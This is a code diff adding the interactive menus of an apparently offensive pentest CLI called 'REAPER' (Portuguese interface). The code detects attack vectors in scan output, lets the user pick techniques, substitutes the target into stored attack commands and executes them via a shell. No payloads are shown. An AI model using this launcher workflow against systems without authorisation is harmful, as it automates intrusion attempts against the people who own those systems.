+        except Exception as e:
+            console.print(f"[red]Erro ao ler ficheiro: {e}[/red]")
+            return None
+    else:
+        lines = []
+        console.print("[dim]Cola o output e escreve FIM numa linha vazia para terminar:[/dim]")
+        while True:
+            line = input()
+            if line.strip().upper() == "FIM":
+                break
+            lines.append(line)
+        return "\n".join(lines)
+
+def _auto_detect_and_attack(scan_output, target, project, save_fn):
+    """Detecta vectores no output e apresenta menu de ataque."""
+    detected, ports = detect_vectors(scan_output, target)
+
+    console.clear()
+    _banner_intel()
+
+    if not detected:
+        console.print(Panel(
+            "[yellow]Nenhum vector conhecido detectado automaticamente.\n"
+            "Usa a opção 'Escolher vector manualmente'.[/yellow]",
+            border_style="yellow"
+        ))
+        _pause()
+        return
+
+    console.print(Panel(
+        f"[green]Vectores detectados:[/green] [bold]{len(detected)}[/bold]  |  "
+        f"[green]Portos abertos:[/green] {', '.join(ports[:10])}",
+        border_style="green"
+    ))
+    console.print()
+
+    t = Table(box=box.ROUNDED, border_style="red", header_style="bold red", show_lines=True)
+    t.add_column("#",       style="bold cyan",  width=4,  justify="center")
+    t.add_column("Vector",  style="bold white", width=20)
+    t.add_column("Serviço", style="dim white",  width=40)
+
+    for i, key in enumerate(detected, 1):
+        v = ATTACK_TREE[key]
+        t.add_row(str(i), f"{v['icon']} {v['label']}", f"Portos relacionados detectados")
+
+    console.print(t)
+    console.print()
+    console.print("[dim][número] Atacar vector  [B] Voltar[/dim]")
+
+    while True:
+        ch = Prompt.ask("[bold red]REAPER › Vectores[/bold red]").strip().upper()
+        if ch == "B":
+            break
+        elif ch.isdigit() and 1 <= int(ch) <= len(detected):
+            key = detected[int(ch)-1]
+            _attack_vector_menu(key, target, project, save_fn)
+            # Após voltar, mostra de novo os vectores
+            console.clear()
+            _banner_intel()
+            console.print(t)
+            console.print()
+            console.print("[dim][número] Atacar vector  [B] Voltar[/dim]")
+
+def _manual_vector_menu(target, project, save_fn):
+    """Escolha manual de vector de ataque."""
+    console.clear()
+    _banner_intel()
+
+    all_vectors = [(k, v) for k, v in ATTACK_TREE.items() if k not in ("privesc","hashes")]
+
+    t = Table(box=box.ROUNDED, border_style="red", header_style="bold red", show_lines=True)
+    t.add_column("#",       style="bold cyan",  width=4, justify="center")
+    t.add_column("Vector",  style="bold white", width=22)
+    t.add_column("Descrição", style="dim white", width=40)
+
+    for i, (k, v) in enumerate(all_vectors, 1):
+        num_attacks = len(v["attacks"])
+        t.add_row(str(i), f"{v['icon']} {v['label']}", f"{num_attacks} técnicas disponíveis")
+
+    console.print(t)
+    console.print()
+    console.print("[dim][número] Escolher  [B] Voltar[/dim]")
+
+    ch = Prompt.ask("[bold red]REAPER › Vector[/bold red]").strip().upper()
+    if ch != "B" and ch.isdigit() and 1 <= int(ch) <= len(all_vectors):
+        key = all_vectors[int(ch)-1][0]
+        _attack_vector_menu(key, target, project, save_fn)
+
+def _attack_vector_menu(vector_key, target, project, save_fn):
+    """Menu de ataques para um vector específico."""
+    vector = ATTACK_TREE[vector_key]
+    color  = vector["color"]
+    attacks = vector["attacks"]
+
+    # Histórico de tentativas nesta sessão
+    tried    = set()
+    success  = set()
+
+    while True:
+        console.clear()
+        _banner_intel()
+        console.print(Panel(
+            f"[{color}]{vector['icon']} {vector['label'].upper()}[/{color}]\n"
+            f"[dim]Alvo: {target}[/dim]",
+            border_style=color
+        ))
+        console.print()
+
+        t = Table(box=box.ROUNDED, border_style=color, header_style=f"bold {color}", show_lines=True)
+        t.add_column("#",          style=f"bold {color}", width=4, justify="center")
+        t.add_column("Técnica",    style="bold white",    width=28)
+        t.add_column("Descrição",  style="dim white",     width=38)
+        t.add_column("Estado",     width=10, justify="center")
+
+        for i, atk in enumerate(attacks, 1):
+            if i in success:
+                estado = "[green]✔ OK[/green]"
+            elif i in tried:
+                estado = "[red]✘ Fail[/red]"
+            else:
+                estado = "[dim]—[/dim]"
+            t.add_row(str(i), atk["name"], atk["desc"], estado)
+
+        console.print(t)
+        console.print()
+        console.print("[dim][número] Executar técnica  [B] Voltar[/dim]")
+
+        ch = Prompt.ask(f"[{color}]REAPER › {vector['label']}[/{color}]").strip().upper()
+        if ch == "B":
+            break
+        elif ch.isdigit() and 1 <= int(ch) <= len(attacks):
+            idx    = int(ch)
+            result = _run_attack(attacks[idx-1], target, color, project, save_fn)
+            tried.add(idx)
+            if result == "success":
+                success.add(idx)
+
+def _run_attack(attack, target, color, project, save_fn):
+    """Executa um ataque específico com recolha de parâmetros."""
+    console.clear()
+    _banner_intel()
+
+    console.print(Panel(
+        f"[{color}]{attack['name'].upper()}[/{color}]\n[dim]{attack['desc']}[/dim]",
+        border_style=color
+    ))
+    console.print()
+
+    # Dicas
+    if attack.get("hints"):
+        console.print(Panel(
+            f"[yellow]💡 DICAS[/yellow]\n{attack['hints']}",
+            border_style="yellow", padding=(0,2)
+        ))
+        console.print()
+
+    # Parâmetros
+    values = {}
+    params = [dict(p) for p in attack.get("params", [])]
+    for p in params:
+        p["default"] = p["default"].replace("{TARGET}", target)
+
+    if params:
+        console.print(f"[{color}]Parâmetros:[/{color}] [dim](ENTER para aceitar valor sugerido)[/dim]\n")
+        for p in params:
+            d = p["default"]
+            label_str = f"  [{color}]{p['label']}[/{color}] [bold white]{d}[/bold white]" if d \
+                        else f"  [{color}]{p['label']}[/{color}]"
+            val = Prompt.ask(label_str, default=d)
+            values[p["key"]] = val
+    else:
+        console.print("[dim]Este comando não necessita de parâmetros adicionais.[/dim]\n")
+
+    # Montar comando
+    cmd = attack["cmd"]
+    for k, v in values.items():
+        cmd = cmd.replace("{" + k + "}", v)
+
+    console.print()
+    console.print(Panel(f"[bold green]{cmd}[/bold green]", title="Comando", border_style="green"))
+    console.print()
+
+    # Acções
+    opts = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
+    opts.add_column(style="bold cyan", width=6); opts.add_column()
+    opts.add_row("[1]", "Executar agora")
+    opts.add_row("[2]", "Guardar nas notas")
+    opts.add_row("[3]", "Executar e guardar")
+    opts.add_row("[B]", "Voltar")
+    console.print(opts)
+
+    ch = Prompt.ask(f"[{color}]Acção[/{color}]").strip().upper()
+
+    if ch in ["1", "3"]:
+        console.print(f"\n[yellow]A executar...[/yellow]\n")
+        console.print(Rule(style="dim green"))
+        try:
+            subprocess.run(cmd, shell=True)
+        except KeyboardInterrupt:
+            console.print("\n[yellow]Interrompido.[/yellow]")
+        console.print(Rule(style="dim green"))
+        console.print()
+
+    if ch in ["2", "3"]:
+        phase_data = project["phases"].get("5", {})
+        existing   = phase_data.get("notas", "")
+        ts         = datetime.datetime.now().strftime("%H:%M:%S")
+        entry      = f"[{ts}] {attack['name']}: {cmd}"
+        phase_data["notas"] = (existing + "\n" + entry).strip()
+        project["phases"]["5"] = phase_data
+        save_fn()
+        console.print(f"[green]✔ Guardado nas notas.[/green]")
+
+    if ch in ["1", "3"]:
+        # Perguntar resultado
+        console.print()
+        res = Prompt.ask(
+            f"[{color}]Resultado[/{color}]\n  [1] Sucesso — funcionou!\n  [2] Falhou\n  [B] Continuar\n\nEscolha"
+        ).strip()
+
+        if res == "1":
+            _show_next_steps(attack, "success", color)
+            return "success"
+        elif res == "2":
+            _show_next_steps(attack, "fail", color)
+            return "fail"
+    else:
+        _pause()
+    return None
+
+def _show_next_steps(attack, outcome, color):
+    """Mostra sugestões de próximos passos consoante o resultado."""
+    followup = attack.get("followup", {}).get(outcome, [])
+    console.print()
+
+    if outcome == "success":
+        console.print(Panel("[bold green]✔ SUCESSO![/bold green]\nPróximos passos sugeridos:", border_style="green"))
+    else:
+        console.print(Panel("[bold red]✘ Falhou[/bold red]\nTenta estes vectores alternativos:", border_style="red"))
+
+    if followup:
+        for i, step in enumerate(followup, 1):
+            console.print(f"  [{i}] [cyan]{step.replace('_', ' ').title()}[/cyan]")
+    else:
+        console.print("  [dim]Sem sugestões automáticas — volta ao menu e tenta outro vector.[/dim]")
+
+    console.print()
+    _pause()
+
+def _pause():
+    console.print("[dim]Prima ENTER para continuar...[/dim]")
+    input()
+
+
 
 # ── Entry point ──────────────────────────────────────────────
 if __name__ == "__main__":
